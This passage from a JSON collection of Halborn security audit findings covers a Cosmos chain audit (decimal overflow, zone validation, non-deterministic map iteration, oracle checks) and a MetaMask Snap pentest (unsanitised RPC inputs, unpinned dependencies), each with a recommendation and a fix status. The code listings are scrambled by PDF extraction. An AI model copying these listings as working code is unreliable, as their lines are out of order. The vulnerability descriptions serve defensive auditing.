        "body": "During the code review, It has been noticed that zone decimal does not have upper bound. Zone decimal can be added with more than 18 decimals. On the ClaimSnMesssage, ClaimShareToken is used when user want to claim their share token. However, If the zone decimal is higher than 18, the following equation will fail and assets could not claim from the system. The oracle address directly can break system through decimal. Code Location: /x/gal/keeper/claim.go, Lines 167 Listing 1 convertDecimal := snAssetDecimal - decimal asset := new ( big . Int ). Mul ( amount , precisionMultiplier (0) ) snAsset := new ( big . Int ). Quo ( asset , precisionMultiplier ( 1 func ( k Keeper ) ConvertWAssetToSnAssetDecimal ( amount * big . Int ,  decimal int64 , denom string ) sdk . Coin { 2 3 4  convertDecimal )) 5 6 } 7 return sdk . NewCoin ( denom , sdk . NewIntFromBigInt ( snAsset )) 21 Proof Of Concept: Scenario:  Register/Change zone with more than 18 decimals.  Even if Its privileged function by the controller, GAL module will lead to chain halt due to above equation. Listing 2 transferPort transferChannel = \" channel -0 \" icaConnection = \" transfer \" = \" connection -1 \" zoneId baseOwnerAcc = sdk . AccAddress ( secp256k1 . GenPrivKey () . = \" baseZone \" 1 var ( 2 3 4 5 6 7  PubKey () . Address () ) 8 9 10 11 ) baseDenom baseSnDenom baseDecimal = \" stake \" = \" snstake \" = int64 (19) 22 Risk Level: Likelihood - 5 Impact - 5 Recommendation: On the ICAControl module, ensure that zone decimal is not higher than 18. Remediation Plan: SOLVED: The A41 team solved the issue in commit 08edd624 by adding the decimal check. 23 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Critical"
        ]
    },
    {
        "title": "UNIQUENESS OF ZONES ARE NOT VALIDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Uniqueness of denom is checked with zone ID on the Registered zones. BaseDenom should be unique for each zone. Even if Its controller privi- leged function. One wrong value set on the denom will be resulted with the funds lost. We recommend ensuring that both BaseDenom is unique throughout all host zones before allowing them to be set in the Regis- terZone. Code Location: /x/icacontrol/keeper/msg_server.go, Lines 99 Listing 3 } if ! k . IsValidControllerAddr ( ctx , zone . ZoneId , zone . IcaAccount . ctx := sdk . UnwrapSDKContext ( goCtx ) return nil , sdkerrors . Wrap ( sdkerrors . ErrInvalidAddress , 1 func ( k msgServer ) ChangeRegisteredZone ( goCtx context . Context ,  zone * types . MsgChangeRegisteredZone ) (* types .  MsgChangeRegisteredZoneResponse , error ) { 2 3 4  ControllerAddress ) { 5  zone . IcaAccount . ControllerAddress ) 6 7 8 9 10 11 12 13 14 15 16 17 18 ZoneId : zone . ZoneId , IcaConnectionInfo : & types . IcaConnectionInfo { ConnectionId : zone . IcaInfo . ConnectionId , PortId : }, TransferInfo : & types . TransferConnectionInfo { }, IcaAccount : & types . IcaAccount { ControllerAddress : zone . IcaAccount . ControllerAddress , HostAddress : zoneInfo := & types . RegisteredZone { zone . IcaAccount . HostAddress , zone . IcaInfo . PortId , 24 PortId : ChannelId : zone . TransferInfo . ChannelId , zone . TransferInfo . PortId , }, ValidatorAddress : zone . ValidatorAddress , BaseDenom : SnDenom : zone . BaseDenom , appendSnPrefix ( types . PrefixSnAsset , zone Decimal : MaxEntries : zone . Decimal , zone . MaxEntries , k. Keeper . RegisterZone ( ctx , zoneInfo ) return & types . MsgChangeRegisteredZoneResponse { zoneInfo . ZoneId , zoneInfo . IcaConnectionInfo , zoneInfo . TransferInfo , ZoneId : IcaInfo : TransferInfo : ValidatorAddress : zoneInfo . ValidatorAddress , BaseDenom : SnDenom : Decimal : MaxEntries : zoneInfo . BaseDenom , zoneInfo . BaseDenom , zoneInfo . Decimal , zoneInfo . MaxEntries , } 19 20 21 22 23 24  . BaseDenom ) , 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 } 41 }, nil 25 Proof Of Concept: Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that all zones are unique and compared with existing zones. Remediation Plan: SOLVED: The A41 team solved the issue in commit b6041991 by adding the validation in the zones. 26 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: High"
        ]
    },
    {
        "title": "MISSING VALIDATION LEADS TO LOST OF FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "On the minting module, at the beginning of block, every time tokens are minted depends on the staking amount. However, If the pool does not exist or contract address is typed wrongly. Minting module can panic, and the chain can halt. On the PoolIncentive module, Pool Contract address is not verified If the distribution operation fails than directly chain will halt with this check. Code Location: /x/mint/keeper/keeper.go, Lines 175 Listing 4 } return nil lpIncentiveCoin := k. bankKeeper . GetBalance ( ctx , moduleAddr , pools := k . PoolIncentiveKeeper . GetAllIncentivePool ( ctx ) if len ( pools ) == 0 { totalWeight := k . PoolIncentiveKeeper . GetTotalWeight ( ctx ) moduleAddr := k. accountKeeper . GetModuleAddress ( types . 1 func ( k Keeper ) distributeLPIncentivePools ( ctx sdk . Context , denom  string ) error { 2 3 4 5 6 7 8  LpIncentiveModuleAccName ) 9  denom ) 10 11 12  Quo ( sdk . NewIntFromUint64 ( totalWeight ). ToDec () ) 13  ( poolWeight ) 14  lpIncentiveCoin . Denom , incentive . TruncateInt () )) 15  PoolContractAddress ) poolWeight := sdk . NewIntFromUint64 ( pool . Weight ). ToDec () . poolAddr , err := sdk . AccAddressFromBech32 ( pool . incentivesCoins := sdk . NewCoins ( sdk . NewCoin ( for _ , pool := range pools { incentive := sdk . NewDecFromInt ( lpIncentiveCoin . Amount ). Mul 27 err = k . bankKeeper . SendCoinsFromModuleToAccount ( ctx , types } return err if err != nil { 16 17 18 19 20  . LpIncentiveModuleAccName , poolAddr , incentivesCoins ) 21 22 23 24 25 26 } } return nil if err != nil { return err } Proof Of Concept: Listing 5 { }{ \" valid case \" , tcs := [] struct { name preset pool shouldErr bool string [] types . IncentivePool types . IncentivePool name : preset : [] types . IncentivePool {} , pool : types . IncentivePool { 1 func ( suite * KeeperTestSuite ) TestCreateIncentivePool () { 2 3 4 5 6 7 8 9 10 11 12  poolincentive -1 \" , 13 14 15 16 17 18 19 20 21 22 23 24 } keeper := suite . App . PoolKeeper // setup for i := range tc . preset { }, shouldErr : false , suite . Run ( tc . name , func () { for _ , tc := range tcs { PoolId : }, \" PoolContractAddress : \" 12345 \" , Weight : 0, 28 err := keeper . CreateIncentivePool ( err := keeper . CreateIncentivePool ( suite . } } else { suite . Error ( err ) if tc . shouldErr { suite . NoError ( err ) 25  suite . Ctx , & tc . preset [ i ]) 26 27 28 29  Ctx , & tc . pool ) 30 31 32 33 34 35  FindIncentivePoolById ( suite . Ctx , tc . pool . PoolId ) 36 37  incentivePool . PoolId ) 38  PoolContractAddress , incentivePool . PoolContractAddress ) 39  incentivePool . Weight ) 40 41 42 43 } suite . Equal ( tc . pool . suite . NoError ( err ) }) } } incentivePool , err := keeper . suite . NoError ( err ) suite . Equal ( tc . pool . PoolId , suite . Equal ( tc . pool . Weight , Risk Level: Likelihood - 4 Impact - 4 Recommendation: Ensure that pool address is validated in the ValidateBasic function. ValidateBasic is happening during the CheckTx phase, and it doesnt have access to the state. In the current implementation, only signer is validated on the ValidateBasic function. 29 Remediation Plan: SOLVED: The A41 team solved the issue in commit 538abc771 by adding the pool contract address validation. 30 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: High"
        ]
    },
    {
        "title": "NON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In several instances of the codebase, iterations are done over maps. Since Go map iterations are non-deterministic, this would cause each validator to produce a different app hash, causing a consensus failure and potentially leading to a chain halt. Code Location: Listing 6 1 x / gal / keeper / grpc_query . go :111 2 x / gal / keeper / withdraw . go :78 3 x / gal / keeper / withdraw . go :135 4 x / gal / keeper / withdraw . go :156 5 x / gal / keeper / withdraw . go :170 6 x / gal / keeper / withdraw . go :186 7 x / gal / keeper / withdraw . go :221 8 app / app . go :373 9 app / app . go :451 10 x / airdrop / keeper / user_state . go :71 Risk Level: Likelihood - 3 Impact - 5 Recommendation: We recommend sorting the map keys into a slice and iterating over the sorted keys to ensure deterministic results among all validators. 31 Remediation Plan: SOLVED: The A41 team solved the issue in commit 0584f524 by adding With this option, Marshaler the stable_marshaler into the protobuf. output is guaranteed to be deterministic. 32 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: High"
        ]
    },
    {
        "title": "BLOCK HEIGHT IS NOT CHECKED WHEN UPDATING STATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The oracle module manages the status of the zones associated with the Supernova protocol. The status includes the amount of coins delegated to the Zones Validator, block height, proof, and so on. This information is injected by the bot at a short interval. For the integrity of the information, the AppHash and block height are provided together. During the code review, It has been observed block height is not checked when updating oracle state. Code Location: /x/oracle/keeper/msg_server.go, Lines 32 Listing 7 } return nil , types . ErrInvalidOperator ctx := sdk . UnwrapSDKContext ( goctx ) if ! server . keeper . IsValidOracleAddress ( ctx , state . ZoneId , 1 func ( server msgServer ) UpdateChainState ( goctx context . Context ,  state * types . MsgUpdateChainState ) (* types .  MsgUpdateChainStateResponse , error ) { 2 3  state . Operator ) { 4 5 6 7 8 9 10 11 12 13 14 15  ZoneId ) Coin : OperatorAddress : state . Operator , LastBlockHeight : state . BlockHeight , AppHash : ZoneId : newOracleState := & types . ChainInfo { state . AppHash , state . ZoneId , state . Coin , } oracleVersion , _ := server . keeper . GetOracleVersion ( ctx , state . 33 16 17 18 19 20 21 22 23  err != nil { 24  err ) 25 26 27  err != nil { 28  err ) 29 30 31 32 } } } trace := types . IBCTrace { Version : oracleVersion + 1, Height : uint64 ( ctx . BlockHeight () ) , } server . keeper . SetOracleVersion ( ctx , state . ZoneId , trace ) if err := server . keeper . UpdateChainState ( ctx , newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , if err := ctx . EventManager () . EmitTypedEvent ( newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , return & types . MsgUpdateChainStateResponse {} , nil Proof Of Concept: 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider using latest Block height from the context. Remediation Plan: SOLVED: The A41 team solved the issue in commit e938023 by adding the block height check. 35 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Medium"
        ]
    },
    {
        "title": "DUPLICATED ZONE LIST IS NOT REMOVED DURING THE GENESIS INITIALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In /x/icacontrol/keeper/genesis.go, the icacontrol genesis validate func- tionality does not remove duplicates from the zone list slice. As the RegisterZone keeper function in /x/icacontrol/keeper/zone.go#L15 uses the zone ID as the key identifier, having duplicate chain ID values in the RegisterZone slice would cause the final index with the same chain ID value to be stored in the storage. As a result, previous zone configu- rations with duplicate zone ID values would be overwritten and ignored completely. Code Location: /x/icacontrol/keeper/msg_server.go, Lines 99 Listing 8 k. SetParams ( ctx , genState . Params ) k . SetControllerAddr ( ctx , controllerInfo . ZoneId , for _ , controllerInfo := range genState . ControllerAddressInfo 1 func ( k Keeper ) InitGenesis ( ctx sdk . Context , genState * types .  GenesisState ) { 2 3 4  { 5  controllerInfo . ControllerAddress ) 6 7 } 8 9 func ( k Keeper ) ExportGenesis ( ctx sdk . Context ) * types . GenesisState  { 10 11 12 } params := k . GetParams ( ctx ) return types . NewGenesisState ( params ) } 36 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Add need validation mechanisms in genesis. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk of issue. They will fix it in a future release. 37 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING VALIDATION ON THE HOST DENOM AND IBC DENOM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ValidateDenom is the default validation function for Host.Denom. In the The system should parameters, Denom is only checked with the length. verify all parameters, even if the controller manages them. Code Location: /x/icacontrol/types/msgs.go, Lines 50 Listing 9 return sdkerrors . Wrapf ( ErrZoneIdNotNil , \" zoneId is not nil if strings . TrimSpace ( msg . IcaInfo . ConnectionId ) == \"\" { return errors . New ( \" missing ICA connection ID \" ) _ , err := sdk . AccAddressFromBech32 ( msg . IcaAccount . } } 1 func ( msg MsgRegisterZone ) ValidateBasic () error { 2 if strings . TrimSpace ( msg . ZoneId ) == \"\" { 3  \" ) 4 5 6 7 8 9 10  ControllerAddress ) 11 12  Invalid controller address \") 13 14 15 16 17 18 19 20 if strings . TrimSpace ( msg . BaseDenom ) == \"\" { return errors . New ( \" missing denom \") if err != nil { } } if strings . TrimSpace ( msg . ValidatorAddress ) == \" \" { return errors . New ( \" missing validator address \" ) return sdkerrors . Wrapf ( sdkerrors . ErrInvalidAddress , \" 38 } if msg . MaxEntries == 0 { return errors . New ( \" cannot set max_entries to zero \") } return nil 21 22 23 24 25 26 27 28 } 29 Proof Of Concept: Listing 10 novatesting \" github . com / Carina - labs / nova / testing \" icacontroltypes \" github . com / Carina - labs / nova / x / icacontrol / \" github . com / cosmos / cosmos - sdk / crypto / keys / secp256k1 \" sdk \" github . com / cosmos / cosmos - sdk / types \" icatypes \" github . com / cosmos / ibc - go / v3 / modules / apps /27 - ibcchanneltypes \" github . com / cosmos / ibc - go / v3 / modules / core 1 package keeper_test 2 3 import ( 4 5  types \" 6 7 8  interchain - accounts / types \" 9  /04 - channel / types \" 10 ) 11 12 var ( 13 14 15 16 17 18  PubKey () . Address () ) 19 20 21 22 ) baseDenom baseSnDenom baseDecimal = \" NOVA \" = \" snNOVA \" = int64 (19) transferPort transferChannel = \" channel -0 \" icaConnection = \" transfer \" = \" connection -1 \" zoneId baseOwnerAcc = sdk . AccAddress ( secp256k1 . GenPrivKey () . = \" baseZone \" 39 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use ValidateDenom with ValidateIBCDenom in the related sections. On the other hand, it is recommended to verify the connection through IBC. Remediation Plan: SOLVED: The A41 team solved the issue in commit 284db08a by adding val- idations. 40 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING FUNCTIONALITY WHEN CONNECTION IS CLOSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When the IBC channel connection was closed, the GAL module was unable to handle the workflow over the connection. Code Location: /x/icacontrol/ibc_mobule.go, Lines 109 Listing 11 ctx sdk . Context , portID , channelID string , 1 func ( im IBCModule ) OnChanCloseConfirm ( 2 3 4 5 ) error { 6 7 } 8 return nil Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to handle the connection when it is closed and confirmed. Remediation Plan: RISK ACCEPTED: The A41 team accepted the risk of this issue. They will fix it in a future release. 41 ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Medium"
        ]
    },
    {
        "title": "ORACLE STATE IS GENERATED INSTEAD OF UPDATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The status of the zones connected to the Supernova protocol is managed by the Oracle module. The status contains information such as block height, proof, block size, and the number of coins assigned to the zone validator. However, when the state is updated, a new state is added instead of an update. The implementation does not check the uniqueness of the zone ID. Code Location: /x/oracle/keeper/msg_server.go#L23 Listing 12 } newOracleState := & types . ChainInfo { return nil , types . ErrInvalidOperator ctx := sdk . UnwrapSDKContext ( goctx ) if ! server . keeper . IsValidOracleAddress ( ctx , state . ZoneId , 1 func ( server msgServer ) UpdateChainState ( goctx context . Context ,  state * types . MsgUpdateChainState ) (* types .  MsgUpdateChainStateResponse , error ) { 2 3  state . Operator ) { 4 5 6 7 8 9 10 11 12 13 14 15  ZoneId ) 16 17 Coin : OperatorAddress : state . Operator , LastBlockHeight : state . BlockHeight , AppHash : ZoneId : state . AppHash , state . ZoneId , trace := types . IBCTrace { state . Coin , } oracleVersion , _ := server . keeper . GetOracleVersion ( ctx , state . 42 Version : oracleVersion + 1, Height : uint64 ( ctx . BlockHeight () ) , } server . keeper . SetOracleVersion ( ctx , state . ZoneId , trace ) if err := server . keeper . UpdateChainState ( ctx , newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , if err := ctx . EventManager () . EmitTypedEvent ( newOracleState ); return nil , sdkerrors . Wrapf ( types . ErrUnknown , \" err : %v \" , return & types . MsgUpdateChainStateResponse {} , nil 18 19 20 21 22 23  err != nil { 24  err ) 25 26 27  err != nil { 28  err ) 29 30 31 32 } } } Risk Level: Likelihood - 3 Impact - 3 43 Proof Of Concept: Recommendation: Consider updating the state instead of generating a new state. Remediation Plan: SOLVED: The A41 team solved the issue in commit bca885ebda by adding zone validation. 44 3.10 (HAL-10) NON-DETERMINISTIC SYSTEM TIME - MEDIUM ",
        "labels": [
            "Halborn",
            "A41_SuperNova_Cosmos",
            "Severity: Informational"
        ]
    },
    {
        "title": "POTENTIAL SAVE OF ARBITRARY CREDENTIALS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The lack of proper input sanitization can lead to several security vul- nerabilities in a software system. An attacker could exploit unsanitized inputs to inject malicious code or commands, potentially leading to unauthorized data access, modification, or deletion; circumvention of security measures; arbitrary code execution; and overall system compro- mise. Details: During the assessment, it was discovered that the exposed RPC endpoint save_credentials is not checking or sanitizing the data received: Listing 1 1 const offer = request . params as any as ClaimOffer ; This data is later used in the rest of the code of the RPC: Listing 2 return acc . concat ([ divider () , text ( cred . description ) , text ( ( acc : any , cred : any ) => { 1 const dialogCredentials = offer . body . credentials . reduce ( 2 3  cred . id ) ]) ; }, 4 5 [] , 6 ); 7 8 const res = await snap . request ({ method : ' snap_dialog ' , 9 10 params : { 11 12 13 }, type : ' confirmation ' , content : panel ([... dialogContent , ... dialogCredentials ]) , 11 14 }) ; 15 16 if ( res ) { 17  privateKeyHex ); 18 19  ; 20 21 22 } const identity = await Identity . create ( identityStorage . const authProof = new AuthZkp ( identity , offer ); const credentials = await authProof . getVerifiableCredentials () await saveCredentials ( credentials ); return credentials ; An attacker with access to execute JS code in the context of a page authorized to contact this Snap App (for example via a Cross-Site Scripting vulnerability) could invoke this endpoint and send arbitrary credentials, partially controlling the flow that uses this data, and finally storing arbitrary credentials. Risk Level: Likelihood - 3 Impact - 3 CVSS Vector:  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L Recommendation: It is recommended to check that each value in the parameters received contains the expected format and that it was legitimately sent by the user. Note that the criticality of this vulnerability was reduced because it requires user interaction. However, note how the attacker would be controlling the offer.from string parameter and other string parameters used to ask the user to allow saving the credentials. 12 Another specially sensitive parameter the attacker could control is url. As the parameters sent by the potential attacker are going to be stored in an object of type ClaimOffer, it is recommended to check each of the fields of this object with regexes to ensure their format (and potentially compare the URL with a list of allowed domains to use): Listing 3 description : string ; id : string ; { }, body : { credentials : [ ]; url : string ; 1 export type ClaimOffer = { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 }; }; from : string ; id : string ; thid ?: string ; to : string ; typ ?: string ; type : string ; Another option to consider fixing this issue would be to add all the logic the client JavaScript is executing (the create_identity call and the fetch request) before calling save_credentials to the save_credentials code, so the potential attacker will not be able to send any data. Remediation Plan: SOLVED: The function isValidSaveCredentialsOfferRequest was added to val- idate the offer before using it. 13 ",
        "labels": [
            "Halborn",
            "Rarimo_Snap_App_WebApp_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "POTENTIAL GENERATION OF ARBITRARY PROOFS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "Similar to the previous issue, this vulnerability is related to the lack of sanitization of the received parameters that allows a potential attacker with access to communicate with the Snap App to try to create proofs Details: In this case, it was observed that a potential attacker could abuse, for example, a XSS vulnerability to generate an arbitrary proof. This is because the attacker would be in complete control of the parameters used to create the proof because there is no input sanitization. The parameters are loaded in the line: Listing 4 1 const params = request . params as any as CreateProofRequest ; And later used to generate the proof without any checking or sanitization: Listing 5 ( cred ) => cred . credentialSubject . id === identityStorage . did , 1 const credentials = ( await findCredentialsByQuery ( params . query )) .  filter ( 2 3 ); 4 5 if (! credentials . length ) { 6 throw new Error ( 7  . did }` , 8 9 } `no credential were issued on the given id ${ identityStorage ); 14 ? [ divider () , text ( ' Credential type ') , text ( ? [ ...( credentialSubject type : ' confirmation ' , content : panel ([ heading (' Create proof ') , ...( credentialType 10 11 const credentialType = params . query . type ; 12 const { credentialSubject } = params . query ; 13 const { circuitId } = params ; 14 15 const res = await snap . request ({ method : ' snap_dialog ' , 16 params : { 17 18 19 20 21 22  credentialType )] : []) , 23 24 25 26 27 28 29 30  fieldName ]; 31  map ( 32 33 34  fieldOperators [ operator ]}\\ n ` , 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 }) ; ( operator ) => { return text ( ] : []) , ...( circuitId }, [] , ]) , ) , ); }, }, ); return acc . concat ( textField ); divider () , text (' Requirements ') , ... Object . keys ( credentialSubject ). reduce ( ( acc : TextField [] , fieldName ) => { const fieldOperators = credentialSubject ?.[ const textField = Object . keys ( fieldOperators ). `$ { fieldName } - ${ operator } $ { ? [ divider () , text ( ' Proof type ') , text ( circuitId )] : []) , 15 50 51 if ( res ) { 52  privateKeyHex ); 53 54 55 } const identity = await Identity . create ( identityStorage . const zkpGen = new ZkpGen ( identity , params , credentials [0]) ; return await zkpGen . generateProof () ; Risk Level: Likelihood - 3 Impact - 3 CVSS Vector:  CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L Recommendation: It is recommended to check that each value in the parameters received contains the expected format and that it was legitimately sent by the user. Note that the criticality of this vulnerability was reduced because it requires user interaction. However, note how the attacker would be controlling the parameters used to ask the user to allow generating the proof. As the parameters sent by the potential attacker are going to be stored in an object of type CreateProofRequest, it is recommended to check each of the fields of this object with regexes to ensure their format and that the content is not malicious. 16 Remediation Plan: SOLVED: The function isValidCreateProofRequest was added to validate the params before using it. 17 ",
        "labels": [
            "Halborn",
            "Rarimo_Snap_App_WebApp_Pentest",
            "Severity: Medium"
        ]
    },
    {
        "title": "DEPENDENCIES SHOULD BE PINNED TO EXACT VERSIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf",
        "body": "The application contains some external dependencies, some of which are not pinned to an exact version but set to a compatible version (x.x.x). This can potentially enable dependency attacks, as observed with the event-stream package with the Copay Bitcoin Wallet. Details: Main package.json: Listing 6 1 \" devDependencies \": { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 } \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" patch - package \": \"^6.5.1\" , \" prettier \": \"^2.2.1\" , \" prettier - plugin - packagejson \": \"^2.2.18\" , \" typescript \": \"^4.7.4\" Snap package.json: 18 Listing 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \" dependencies \": { \" @ethersproject / abi \": \"^5.0.0\" , \" @ethersproject / bytes \": \"^5.7.0\" , \" @ethersproject / keccak256 \": \"^5.7.0\" , \" @ethersproject / providers \": \"^5.7.2\" , \" @iden3 / js - crypto \": \"^1.0.0 - beta .1\" , \" @iden3 / js - iden3 - core \": \"^1.0.0 - beta .2\" , \" @iden3 / js - jsonld - merklization \": \"^1.0.0 - beta .14\" , \" @iden3 / js - jwz \": \"^1.0.0 - beta .2\" , \" @iden3 / js - merkletree \": \"^1.0.0 - beta .1\" , \" @metamask / snaps - jest \": \"^0.35.2 - flask .1\" , \" @metamask / snaps - types \": \"^0.32.2\" , \" @metamask / snaps - ui \": \"^0.32.2\" , \" buffer \": \"^6.0.3\" , \" ethers \": \"^5.7.2\" , \" intl \": \"^1.2.5\" , \" uuid \": \"^9.0.0\" }, \" devDependencies \": { \" @jest / globals \": \"^29.5.0\" , \" @lavamoat / allow - scripts \": \"^2.0.3\" , \" @metamask / auto - changelog \": \"^2.6.0\" , \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @metamask / snaps - cli \": \"^0.32.2\" , \" @types / intl \": \"^1.2.0\" , \" @types / uuid \": \"^9.0.2\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" esbuild \": \"^0.17.19\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" jest \": \"^29.5.0\" , \" node - stdlib - browser \": \"^1.2.0\" , \" nodemon \": \"2.0.20\" , \" prettier \": \"^2.2.1\" , 19 \" prettier - plugin - packagejson \": \"^2.2.11\" , \" rimraf \": \"^3.0.2\" , \"ts - jest \": \"^29.1.0\" , \" typescript \": \"^4.7.4\" 44 45 46 47 48 } Site package.json: Listing 8 }, \" devDependencies \": { \" @metamask / providers \": \"^9.0.0\" , \" react \": \"^18.2.0\" , \" react - dom \": \"^18.2.0\" , \" react - is \": \"^18.2.0\" , \" styled - components \": \"5.3.3\" 1 \" dependencies \": { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \" @metamask / eslint - config \": \"^10.0.0\" , \" @metamask / eslint - config - jest \": \"^10.0.0\" , \" @metamask / eslint - config - nodejs \": \"^10.0.0\" , \" @metamask / eslint - config - typescript \": \"^10.0.0\" , \" @svgr / webpack \": \"^6.4.0\" , \" @testing - library / dom \": \"^8.17.1\" , \" @testing - library / jest - dom \": \"^5.16.4\" , \" @testing - library / react \": \"^13.3.0\" , \" @testing - library / user - event \": \"^13.5.0\" , \" @types / jest \": \"^27.5.2\" , \" @types / react \": \"^18.0.15\" , \" @types / react - dom \": \"^18.0.6\" , \" @types / styled - components \": \"^5.1.25\" , \" @typescript - eslint / eslint - plugin \": \"^5.33.0\" , \" @typescript - eslint / parser \": \"^5.33.0\" , \" cross - env \": \"^7.0.3\" , \" eslint \": \"^8.21.0\" , \" eslint - config - prettier \": \"^8.1.0\" , \" eslint - plugin - import \": \"^2.26.0\" , \" eslint - plugin - jest \": \"^26.8.2\" , \" eslint - plugin - jsdoc \": \"^39.2.9\" , \" eslint - plugin - node \": \"^11.1.0\" , \" eslint - plugin - prettier \": \"^4.2.1\" , \" gatsby \": \"^4.24.4\" , \" gatsby - plugin - manifest \": \"^4.24.0\" , 20 \" gatsby - plugin - styled - components \": \"^5.24.0\" , \" gatsby - plugin - svgr \": \"^3.0.0 - beta .0\" , \" prettier \": \"^2.2.1\" , \" prettier - plugin - packagejson \": \"^2.2.18\" , \" rimraf \": \"^3.0.2\" , \" typescript \": \"^4.7.4\" 34 35 36 37 38 39 40 } Risk Level: Likelihood - 2 Impact - 2 CVSS Vector:  CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N Recommendation: Pinning dependencies to an exact version (=x.x.x) can reduce the possi- bility of inadvertently introducing a malicious version of a dependency in the future. Remediation Plan: SOLVED: All the dependencies are now pinned to exact versions. 21 ",
        "labels": [
            "Halborn",
            "Rarimo_Snap_App_WebApp_Pentest",
            "Severity: Low"
        ]
    },
    {
        "title": "RESTRICT SITES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Web Pentest/Rarimo_Snap_App_WebApp_Pentest_Report_Halborn_Final.pdf",
